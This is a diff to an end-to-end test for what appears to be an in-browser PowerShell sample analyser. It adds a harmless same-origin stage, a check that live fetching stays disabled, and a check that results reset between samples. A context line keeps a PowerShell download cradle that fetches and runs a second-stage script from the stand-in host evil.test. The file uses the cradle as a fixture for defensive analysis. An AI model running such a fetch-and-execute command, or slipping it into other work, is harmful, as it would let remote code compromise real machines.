@@ -70,10 +70,30 @@ const DROPPER = [
  */
 const CRADLE = String.raw`IEX (New-Object Net.WebClient).DownloadString('http://evil.test/a/stage2.ps1?v=7')`;
 
+/**
+ * A stage served from the harness itself.
+ *
+ * Live mode needs somewhere to fetch from, and it cannot be a real URL: this
+ * file asserts that nothing leaves the page. Same-origin satisfies both - the
+ * request is real, goes through the fetch boundary like any other, and stays
+ * local. It is deliberately not under `husk-engine/`, which the boundary lets
+ * through untouched as a runtime asset.
+ *
+ * Kept although nothing fetches it today: fetching a stage from outside the
+ * engine, on the main thread and asynchronously, is the way live mode could
+ * work, and this is what that would be tested against.
+ */
+const LIVE_STAGE = String.raw`Set-Content -Path 'C:\Users\Public\live-stage-ran.txt' -Value 'live'`;
+const LIVE_STAGE_PATH = 'husk-e2e-stage.ps1';
+
 const serve = () =>
   createServer((request, response) => {
     let path = decodeURIComponent(request.url.split('?')[0]);
     if (BASE !== '/' && path.startsWith(BASE)) path = path.slice(BASE.length - 1);
+    if (path === `/${LIVE_STAGE_PATH}`) {
+      response.writeHead(200, { 'Content-Type': 'text/plain' });
+      return response.end(LIVE_STAGE);
+    }
     let file = join(DIST, path);
     // A single-page app: anything that is not a file is the shell.
     if (!existsSync(file) || statSync(file).isDirectory()) file = join(DIST, 'index.html');
@@ -188,6 +208,38 @@ async function main() {
       chainFollowed = false;
     }
     check(chainFollowed, 'a supplied stage runs, and what it wrote is reported');
+
+    // No live fetching is offered, and that is load-bearing rather than a
+    // preference. Writing this check as "live mode fetches a same-origin stage"
+    // is what found the crash: the request went out, the stage was served, and
+    // the engine worker died 2.8s later - every time, and never when the same
+    // run downloaded nothing. A synchronous request from inside the engine is
+    // the only kind a PowerShell proxy can return, and it takes the worker with
+    // it. So the control is gone, and this asserts it stays gone.
+    check(
+      (await page.locator('#husk-live').count()) === 0,
+      'no control offers to fetch an unmatched URL',
+    );
+
+    // A second sample in the same engine reports its own result and none of the
+    // previous one's. The boundary ledger cannot fill at all without live
+    // fetching, so this no longer covers the worker's drainBoundary() call -
+    // see the port log. It still covers the per-run reset of everything else.
+    await page.fill('#husk-input', String.raw`Set-Content -Path 'C:\Users\Public\second.txt' -Value 'x'`);
+    await page.getByRole('button', { name: 'Analyse' }).click();
+    let secondRan = true;
+    try {
+      await page.waitForFunction(
+        () =>
+          document.body.innerText.includes('second.txt') &&
+          !document.body.innerText.includes('stage2-ran.txt'),
+        null,
+        { timeout: 300_000 },
+      );
+    } catch {
+      secondRan = false;
+    }
+    check(secondRan, "the next sample reports its own result and not the last one's");
 
     check(pageErrors.length === 0, `no page errors${pageErrors.length ? `: ${pageErrors[0]}` : ''}`);
     check(offsite.length === 0, `nothing left the page${offsite.length ? `: ${offsite[0]}` : ''}`);
